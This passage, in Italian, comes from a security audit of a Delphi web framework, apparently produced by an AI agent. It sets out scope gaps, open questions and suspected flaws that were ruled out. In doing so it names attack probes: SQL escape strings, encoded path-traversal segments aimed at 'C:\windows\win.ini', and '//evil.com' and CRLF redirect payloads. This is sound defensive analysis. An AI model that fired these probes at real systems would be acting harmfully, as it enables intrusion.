| N-10 | Se Indy limiti `PostStream` da qualche parte nella build vendorizzata | Verificato che `MVCFramework.Server.Indy.pas:116-131` non imposta alcun cap; non è stato auditato `IdCustomHTTPServer.pas` per un default interno. |
| N-11 | PostgreSQL con `standard_conforming_strings = off` | Renderebbe `\'` un escape e riaprirebbe l'iniezione sui valori RQL per PG. È `off` per default da PG 9.1 e il framework non lo imposta mai; nessuna evidenza che una configurazione supportata lo faccia. Annotato perché l'assunzione resti agli atti. |
| N-12 | ReDoS via `[MVCPattern]` | `sources/MVCFramework.Validators.pas:1457` fa `TRegEx.IsMatch(LStr, FPattern)` con `LStr` dall'utente, nessun cap di lunghezza né timeout di match. Il pattern però lo scrive lo sviluppatore, quindi è (C) — a meno di trovare un pattern catastrofico **nel framework stesso**, che non ho trovato. Nessun benchmark eseguito. |

---

## 6. Superficie coperta e superficie NON coperta

### Coperta (analisi statica, codice letto riga per riga)

- Session store: memory, file, database — generazione ID, ciclo di vita, cookie, fixation.
- JWT: `MVCFramework.JWT.pas`, `.HMAC.pas`, `Middleware.JWT.pas` (varianti header e cookie).
- Auth: `Middleware.Authentication.pas`, `RoleBasedAuthHandler.pas`, `Middleware.OIDC.pas` (state/nonce).
- Static files: middleware + filtro + `TMVCStaticContents` + `RangeMedia` (entrambe le versioni).
- RQL: parser e tutti e sei i compiler di dialetto; `ActiveRecord.pas` per i sink SQL; `ActiveRecordController.pas`.
- Header di risposta, CORS (middleware + filtro), redirect, rate limit (memory + Redis), cookie sui 3 adapter.
- Parsing della richiesta su tutti e tre gli host: path, verbo, header, query string, normalizzazione — con
  tabella comparativa. Router: matching, case-sensitivity, cattura parametrica.
- Deserializzazione: `Serializer.JsonDataObjects.pas`, `JsonDataObjects.pas`, parser multipart, binding
  `[MVCFromBody]`, `TMVCFormFile`, middleware Compression.
- `TMVCRESTClient` (TLS, redirect).
- Config di default di `TMVCEngine`, `SysControllers`, rendering delle eccezioni, `DotEnv`.
- `ideexpert/templates/` per i default che il wizard genera.
- TemplatePro: solo `HTMLEncode` e i punti in cui è applicato.
- Versioni e CVE di ogni libreria vendorizzata e di ogni DLL committata nel repo.

### NON coperta — non fidarsi del silenzio qui

- **Verifica dinamica: quasi nessuna.** Le uniche misure eseguite sono C-01 (profondità JSON) e H-10 (tempi del
  parser multipart), in programmi console standalone nello scratchpad. Nessun server è stato avviato, nessuna
  richiesta HTTP inviata. Le voci N-01…N-10 sono esattamente i punti dove l'analisi statica si è fermata.
- **WebSocket** (`WebSocket.Server.pas`, `.Client.pas`): non analizzato. Origin check dell'handshake, framing,
  limiti di dimensione dei messaggi, ping/pong flood — tutto scoperto.
- **JSON-RPC** (`MVCFramework.JSONRPC.pas`): `PublishObject` espone metodi via RTTI. Quali metodi diventino
  raggiungibili, se `MVCJSONRPCAllowGET` apra superficie CSRF, e il binding dei parametri — non analizzati.
- **SSE** (`MVCFramework.SSE.pas`, `.SSEController.pas`): non analizzato.
- **`MVCFramework.Container.pas`** (DI): risoluzione per nome da input — non analizzata.
- **`Middleware.OpenAPI3.pas` / `.Swagger.pas`**: cosa espongono e a chi — non analizzati (in lavorazione da un
  altro agente su un branch).
- **`Cache.pas`, `LRUCache`, `BloomFilter`**: cache poisoning / chiavi di cache — non analizzati.
- **Serializzatori diversi da JsonDataObjects**: coperti solo di striscio via M-04.
- **TemplatePro oltre `HTMLEncode`**: i filtri `json`/`urlencode`, il contesto attributo non quotato, il contesto
  JS, `{{include}}` con nome dinamico, la cache dei template — non analizzati.
- **Codice dei `samples/`**: fuori scope tranne dove citato (`articles_crud_server` in H-11).
- **`lib/dmustache`, `lib/swagdoc`, `lib/loggerpro` come *codice***: non letti (solo versione/CVE, §4).
- **Concorrenza:** race condition su strutture globali (`GlobalSessionList`, cache del router, registry) non
  analizzate sistematicamente. Una TOCTOU su una struttura condivisa può diventare un problema di sicurezza.
- **Sicurezza del deployment**: permessi di file, ACL della directory di sessione, esecuzione come servizio —
  fuori scope.

---

## 7. Cosa ho smontato

Queste sembravano falle e non lo sono. Sezione da leggere prima di "rifixare" domani qualcosa che è già a posto.

**JWT — la parte crittografica è corretta.**
- Confronto della firma **constant-time**: `THMACJWTSigner.Verify` (`JWT.pas:635-649`) fa check di lunghezza poi
  XOR/OR accumulato. Nessun timing oracle.
- **Nessuna algorithm confusion**: `IsValidToken` (`JWT.pas:775`) confronta l'`alg` del token con quello del
  **signer configurato** e rifiuta se differisce; e in ogni caso `Sign` usa `FAlgorithm` (il proprio), mai quello
  del token. `alg: none` non ha un signer registrato e cade sul mismatch.
- **`exp`/`nbf`/`iat` fail-closed**: `CheckExpirationTime`/`CheckNotBefore`/`CheckIssuedAt` (`JWT.pas:533-615`)
  ritornano `False` se il claim **manca**, non lo saltano. Tutti e tre sono nel default `FRegClaimsToChecks` di
  entrambi i costruttori (`:663`, `:675`). Leeway di default 300 s: generoso ma documentato e configurabile.
- Il segreto demo pubblico è rifiutato con un'eccezione esplicita (`JWT.pas:380-390`, GHSA-hgv7-ch4w-2f47), e
  così il segreto vuoto. *(Il buco è nel wizard che ne introduce uno diverso — H-07.)*
- Registry HMAC case-sensitive ma `alg` confrontato con `SameText`: non è un problema, perché il signer usa la
  propria stringa di algoritmo per firmare, non quella del token.

**Entropia degli ID di sessione — a posto.** `GenerateSessionID` (`MVCFramework.pas:1636-1643`) concatena **tre**
`TGUID.NewGuid`. Su Windows `CreateGUID` → `CoCreateGuid` → `UuidCreate`, che è un v4 da CSPRNG. Non è `Random`,
non è un contatore, non è un GUID sequenziale. *Il problema del session store è il path traversal (C-02), non
l'entropia.*

**`X-Forwarded-For` non è fidato di default.** `MVCTrustProxyForwardedHeaders: Boolean = False`
(`Commons.pas:695`) e `MVCResolveClientIP` (`:956-970`) lo ignora se non abilitato. Corretto, e corretto in tutti
e quattro i consumer (`Indy.Request.pas:634`, `HttpSys.Request.pas:821`, `WebBroker.Request.pas:216`,
`WebSocket.Server.pas:341`). Il rate limiter in modalità IP **non** è aggirabile. *(M-06 è il caso opposto: una
ACL che non dovrebbe usare l'IP risolto.)*

**Nessuna SQL injection attraverso i valori RQL.** I compiler concatenano invece di parametrizzare, ma
l'escaping tiene su tutti e sei i dialetti: numerici e booleani passano da un lexer che ammette solo cifre/segno/
un punto (`Parser.pas:1048`, `:970`), le stringhe passano da `QuotedString('''')` (raddoppio SQL-92), e il buco
del backslash su MySQL/MariaDB **è già chiuso** (`AST2MySQL.pas:60-66`, `QuoteMySQLString` + override di
`QuoteStringArray`). Il doppio quoting sospettato su `contains`/`starts` è guardato in tutti i dialetti
(`and not (Token in [tkContains, tkStarts])`). Provati `'`, `''`, `\'`, `\\'`, `\"`, omoglifi U+2019/U+02BC e
smuggling di parentesi: nessuno passa.

**Il segmento URL `($id)` è parametrizzato lato SQL.** `ExtractPKValues` (`ActiveRecordController.pas:150`) →
`LoadByPKs` → `CreateSelectByPKSQL` genera `WHERE pk = :pk` (`ActiveRecord.pas:5917-5930`). Anche la forma
composita JSON-array è tipizzata via JsonDataObjects e finisce bindata. *(H-04 è un problema di routing, non di
SQL.)*

**Non si raggiunge un'entità/tabella non registrata.** `FindEntityClassByURLSegment` (`ActiveRecord.pas:5752`) è
un lookup su dizionario popolato solo da `AddEntity(urlSegment, class)` espliciti; un segmento sconosciuto dà 404
(`ActiveRecordController.pas:294`). Il segmento URL è una chiave di whitelist, mai un nome di tabella.

**Nessuna API raw-SQL di `TMVCActiveRecord` è esposta direttamente a HTTP.** `Where`, `Select`, `GetOneByWhere`,
`ExecNonQuery` accettano frammenti SQL concatenati, ma `TMVCActiveRecordController` è l'unico ponte verso la rete
ed espone **solo** la superficie RQL (`ActiveRecordController.pas:230`, `:236`). Verificato: nessun
`QueryStringParam`/`Request.Body` in `ActiveRecord.pas`, `Repository.pas`, `Middleware.ActiveRecord.pas`.

**Il containment check dello static-files è scritto bene.** `MVCFramework.pas:4064-4071` usa
`IncludeTrailingPathDelimiter` e compare case-insensitive sotto `{$IFDEF MSWINDOWS}`: `C:\wwwroot-evil` **non**
passa quando la root è `C:\wwwroot`. Idem `RangeMedia.pas:160-161`/`:216` e `Filters.pas:1755-1761`/`:1816-1818`.
Il bug di C-03 è che il *risultato* viene ignorato, non il check.

**L'HTTPFilter `StaticFiles` (`Filters.pas:623-685`) è sano.** Rifiuta `..` e `:` a `:650`, poi fa un vero
`GetFullPath` + containment con delimitatore a `:662-666`, e **onora il risultato**. È la versione che il wizard
minimal-API emette (`engineconfig.pas.tpro:277`) ed è il modello che le altre due dovrebbero copiare.

**Nessun path traversal in `RangeMedia`.** `:211-217` canonicalizza con `GetFullPath` *e* onora il risultato. Lo
shortcut di `TPath.Combine` sul Path2 rooted restituisce `C:\windows\win.ini`, ma lo
`StartsWith(FDocumentRoot, True)` successivo lo rifiuta.

**Aritmetica del `Range` corretta.** `RangeMedia.pas:271-294`: `TryStrToInt64` rifiuta la spazzatura e i valori
fuori Int64; `Min(ARangeEnd, AFileSize-1)` clampa; `bytes=-<enorme>` → `Max(0, FileSize-N)` = 0 senza wrap;
`bytes=--5` → start > end → 416. Multi-range rifiutato a `:255`, nessun codice `multipart/byteranges`, quindi
niente amplificazione. L'unico problema del `Range` è l'allocazione (M-09), non l'aritmetica.

**Non esiste directory listing.** Nessun `TDirectory.GetFiles`/`GetFileSystemEntries` nei percorsi di serving:
una richiesta a una directory dà 301, l'index document, o niente (`StaticFiles.pas:321-336`). Nessun input
riflesso, quindi nessun XSS da listing.

**Nessun bypass per doppia codifica nello static-files.** La decodifica è **single-pass**: `%252e` resta il testo
letterale `%2e`. `GetFullPathName` di Windows non fa folding unicode→ASCII, quindi l'overlong `%c0%ae` non
diventa `.`. *(Il `%uXXXX` di M-02 è un problema diverso e reale, ma vive sul percorso query, non sullo static.)*

**Nessuna origin reflection in CORS.** Entrambi i matcher sono uguaglianza stretta:
`SameText(lRequestOrigin, lAllowed)` (`Middleware.CORS.pas:174`) e `SameText(ARequestOrigin, lTrimmed)` in
`MVCMatchCORSOrigin` (`Filters.pas`). Nessun `Contains`/`StartsWith`/`EndsWith` nel percorso dell'origin: niente
`evil-victim.com` né `victim.com.evil.com`. Con `*` configurato viene restituito il letterale `*`, mai l'origin
della richiesta.

**Il preflight non scavalca l'autenticazione in modo pericoloso.** `Middleware.CORS.pas:234-245` e il
`CORSFilter` cortocircuitano `OPTIONS` prima dell'auth, ma restituiscono `204`/`200` con body vuoto e senza
dispatch di route. Nessun handler gira, niente trapela. È il comportamento CORS richiesto.

**Nessun open redirect nel framework.** `TMVCRedirectMiddleware` (`Middleware.Redirect.pas:83-101`) usa la
costante `fRedirectToURL` del costruttore; la richiesta partecipa solo a un match esatto. Il 301 dello
static-files (`StaticFiles.pas:326`) mette sì `Request.PathInfo` in `Location`, ma è gated su
`TDirectory.Exists(lFullPathInfo)` (`:322`): il path deve risolvere a una directory reale, quindi né
`//evil.com` né un payload CRLF ci arrivano.

**Nessun campo cookie perso dopo `e5a47ea1`.** Il `TCookie` della RTL (`Web.HTTPApp.pas:249-273`) ha esattamente
otto campi — Name, Value, Domain, Path, Expires, Secure, HttpOnly, SameSite. Non esiste `MaxAge`, `Partitioned`
o `Priority` da perdere. Indy (`Indy.Response.pas:236-244`) e HTTP.sys (`HttpSys.Response.pas:329-343`) li
coprono tutti e otto. La differenza residua è di **encoding**, non di copertura (M-08).

**`SetCustomHeader` è protetto su tutti e tre gli host** (`Indy.Response.pas:271`, `HttpSys.Response.pas:418`,
`WebBroker.Response.pas:159`). Sono gli *altri* percorsi header a non esserlo (H-05).

**OIDC: state e nonce sono validati, e falliscono chiusi.** Un cookie di stato mancante o malformato porta a
`AState`/`ANonce` vuoti (`Middleware.OIDC.pas:895-899`); il confronto dello state con `SameText('','')`
passerebbe, **ma** il check del nonce a `:997-1000` solleva esplicitamente su nonce vuoto. Il cookie di stato è
`HttpOnly`, `Secure` (configurabile) e `SameSite=Lax` (`:867-872`), TTL 10 minuti, cancellato all'uso. Corretto.
(`SameText` non è constant-time, ma lo state è un token anti-CSRF a uso singolo, non un segreto: irrilevante.)

**`TMVCTraceMiddleware` redige già i segreti.** `RedactedCustomHeaders` (`Middleware.Trace.pas:80-101`) maschera
`Authorization`, `Proxy-Authorization`, `Cookie`, `Set-Cookie` via `MVCRedactSecret`. Continua a loggare i body
(clampati a 1024 char di default), quindi resta vero che non va abilitato in produzione su rotte che portano
password — ma non è la svista che sembrava.

**`TemplatePro` escapa correttamente per default.** `HTMLEncode` (`TemplatePro.pas:3456+`) copre `& > < " '`,
sufficiente per il testo HTML e per gli attributi quotati. `{{:x}}` è escapato, `{{:x$}}` è raw per scelta
esplicita. Il contesto attributo non quotato e il contesto JS restano responsabilità dell'app — comportamento
normale per un template engine.

**Nessuna decompression bomb.** `sources/MVCFramework.Middleware.Compression.pas` comprime **solo le risposte**:
`OnAfterRouting` (`:76`) legge `AContext.Response.ContentStream` e scrive un `TZCompressionStream` (`:141`);
`OnBeforeRouting` (`:222`) e `OnBeforeControllerAction` (`:216`) sono stub vuoti.
`grep -rn "ZDecompress|TZDecompressionStream|DecompressStream" sources/` non restituisce **nulla fuori da
`RESTClient`** (lato client). Nessun host decomprime un body di richiesta.

**Il parser multipart non ha loop infiniti né allocazioni illimitate.** `lPos := lNextBoundary` (`:869`, `:826`)
è sempre `-1` oppure `> lPos`, perché `IndexOfBytes` parte da `lPartStart = lPos + lBoundaryLen` con
`lBoundaryLen ≥ 3`: progresso stretto a ogni iterazione. `lBoundary = ''` esce a `:778-779`, e `boundary=""` si
de-quota a `''` e esce anch'esso. Le allocazioni per parte sono limitate dal body. *Il problema è la complessità
quadratica (H-10), non la terminazione.*

**RTTI: privati e protetti NON sono esposti di default.** Il tipo di serializzazione di default è `stDefault`,
trattato come `stProperties` in ogni switch (`Serializer.JsonDataObjects.pas:2459`, `:2771`, `:2856`, `:2980`), e
la visibilità di default delle property della RTL è `[vcPublic, vcPublished]`. *(Il rischio esiste solo sotto
`[MVCSerialize(stFields)]` — L-14.)*

**`MaxRequestSize` esiste e ha un default sensato** (5 MiB, `Commons.pas:137`, `MVCFramework.pas:2571`), con un
double-check dopo `ReadTotalContent` sul percorso WebBroker (`MVCFramework.pas:2797-2806`), che è l'unico host
con l'ordine giusto. *I buchi sono specifici: HTTP.sys alloca prima (C-04), Indy non lo applica a chunked
(M-01), e per C-01 e H-10 è la dimensione sbagliata da misurare.*

**`MVCFramework.Middleware.Authentication` inizializza `IsAuthorized := False`** prima della chiamata (`:253`,
`:414`) — fail-closed, correttamente. È solo il middleware JWT a non farlo (H-09).

**Il `Format` di `TPartitionInfo.InitializeFilterStrings` (`ActiveRecord.pas:6797`) non è raggiungibile dalla
richiesta.** `FieldNames`/`FieldValues` sono parsati una volta dall'attributo `[MVCPartition(...)]`, un letterale
di compile-time. *(È però quotato con l'escape sbagliato — `QuotedString('"')` raddoppia mentre il lexer RQL si
aspetta `\"` — quindi diventerebbe il punto di iniezione il giorno in cui un tenant id arrivasse da una
richiesta. Vale una riga di hardening preventivo.)*

**Il punto e virgola non è un separatore di query su nessun host.** Coerente fra i tre, e coerente con i proxy
moderni.

**Nessun compiler RQL per MongoDB in questo albero.** Il set spedito è Firebird, Interbase (eredita da Firebird),
MySQL, PostgreSQL, MSSQL, SQLite, Oracle.

**`JsonDataObjects` non ha CVE e non gli manca alcun fix di sicurezza upstream.** Verificato commit per commit: i
due commit upstream assenti sono funzionali (separatore decimale in `BigDecimalToString`, parser standalone), non
di sicurezza. *(C-01 è un bug che upstream ha anch'esso.)*
